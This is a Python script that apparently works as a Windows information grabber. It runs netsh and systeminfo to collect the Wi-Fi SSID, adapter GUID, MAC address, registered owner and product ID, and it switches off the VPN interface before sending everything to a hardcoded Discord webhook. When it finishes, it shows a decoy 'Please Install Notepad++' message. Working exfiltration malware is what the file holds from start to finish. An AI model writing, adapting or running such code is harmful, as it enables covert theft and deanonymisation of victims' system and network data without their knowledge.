import subprocess
import json
import requests
import time

# Webhook URL
webhook_url = "https://discord.com/api/webhooks/1391571332503830539/hpXl7KEPQj4gdLCGBZlkGRC2QhbF3CUmOjEcFz7Bn-g7p6KW27JoUXPTJCkP1IOKRMHb"

# Function to run a shell command and get the output
def run_command(command):
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    return result.stdout.strip()

# Disable VPN (replace with your actual VPN name)
def disable_vpn(vpn_name):
    subprocess.run(f'netsh interface set interface "{vpn_name}" disable', shell=True)

# Re-enable VPN
def enable_vpn(vpn_name):
    subprocess.run(f'netsh interface set interface "{vpn_name}" enable', shell=True)

# Collect network info
def collect_network_info():
    ssid = run_command('netsh wlan show interface | findstr /i "SSID"').split(":")[1].strip()
    adapter = run_command('netsh wlan show interface | findstr /i "Description"').split(":")[1].strip()
    state = run_command('netsh wlan show interface | findstr /i "State"').split(":")[1].strip()
    signal = run_command('netsh wlan show interface | findstr /i "Signal"').split(":")[1].strip()
    guid = run_command('netsh wlan show interface | findstr /i "GUID"').split(":")[1].strip()
    phya = run_command('netsh wlan show interface | findstr /i "Physical address"').split(":")[1].strip()
    return ssid, adapter, state, signal, guid, phya

# Collect ping and packet info
def collect_ping_info():
    ping_output = run_command('ping -n 3 8.8.8.8')
    avg_ping = [line for line in ping_output.splitlines() if "Average" in line][0].split(" ")[-1]
    packet_loss = [line for line in ping_output.splitlines() if "Lost" in line][0].split(" ")[-2]
    netstat_output = run_command('netstat -e')
    rbytes = netstat_output.splitlines()[3].split()[1]  # Received bytes
    sbytes = netstat_output.splitlines()[3].split()[2]  # Sent bytes
    return avg_ping, packet_loss, rbytes, sbytes

# Collect system info
def collect_system_info():
    os_name = run_command('systeminfo | findstr /i "OS Name"').split(":")[1].strip()
    os_version = run_command('systeminfo | findstr /i "OS Version"').split(":")[1].strip()
    os_manufacturer = run_command('systeminfo | findstr /i "OS Manufacturer"').split(":")[1].strip()
    os_config = run_command('systeminfo | findstr /i "OS Configuration"').split(":")[1].strip()
    os_owner = run_command('systeminfo | findstr /i "Registered Owner"').split(":")[1].strip()
    product_id = run_command('systeminfo | findstr /i "Product ID"').split(":")[1].strip()
    return os_name, os_version, os_manufacturer, os_config, os_owner, product_id

# Prepare JSON payload
def create_json_payload(network_info, ping_info, system_info):
    ssid, adapter, state, signal, guid, phya = network_info
    avg_ping, packet_loss, rbytes, sbytes = ping_info
    os_name, os_version, os_manufacturer, os_config, os_owner, product_id = system_info

    payload = {
        "username": "Rexy Tools",
        "embeds": [
            {
                "title": "NETWORK STATUS",
                "color": 16711680,
                "fields": [
                    {"name": "Wi-Fi Name", "value": f"||``{ssid}``||", "inline": True},
                    {"name": "GUID", "value": f"||``{guid}``||", "inline": True},
                    {"name": "Signal", "value": f"``{signal}``", "inline": True},
                    {"name": "Adapter", "value": f"``{adapter}``", "inline": True},
                    {"name": "State", "value": f"``{state}``", "inline": True},
                    {"name": "Ping (Avg)", "value": f"``{avg_ping}``", "inline": True},
                    {"name": "Packet Loss", "value": f"``{packet_loss}``", "inline": True},
                    {"name": "Received Bytes", "value": f"``{rbytes}``", "inline": True},
                    {"name": "Sent Bytes", "value": f"``{sbytes}``", "inline": True}
                ]
            },
            {
                "title": "COMPUTER INFO",
                "color": 16711680,
                "fields": [
                    {"name": "Username", "value": f"||``{os_owner}``||", "inline": True},
                    {"name": "OS Name", "value": f"``{os_name}``", "inline": True},
                    {"name": "OS Version", "value": f"``{os_version}``", "inline": True},
                    {"name": "OS Manufacturer", "value": f"``{os_manufacturer}``", "inline": True},
                    {"name": "OS Configuration", "value": f"``{os_config}``", "inline": True},
                    {"name": "Registered Owner", "value": f"||``{os_owner}``||", "inline": True},
                    {"name": "Product ID", "value": f"||``{product_id}``||", "inline": True}
                ]
            }
        ]
    }
    return payload

# Send data to Discord Webhook
def send_data_to_webhook(payload):
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 204:
        print("Data sent successfully.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")

# Show final message (using tkinter)
def show_message():
    import tkinter as tk
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    tk.messagebox.showinfo("Information", "Please Install Notepad++.")

def main():
    # Disable VPN temporarily (replace with your actual VPN name)
    vpn_name = "VPN Connection Name"
    disable_vpn(vpn_name)
    time.sleep(5)  # Wait for 5 seconds

    # Collect all necessary information
    network_info = collect_network_info()
    ping_info = collect_ping_info()
    system_info = collect_system_info()

    # Create JSON payload
    payload = create_json_payload(network_info, ping_info, system_info)

    # Send data to the webhook
    send_data_to_webhook(payload)

    # Re-enable VPN
    enable_vpn(vpn_name)

    # Show final message
    show_message()

if __name__ == "__main__":
    main()
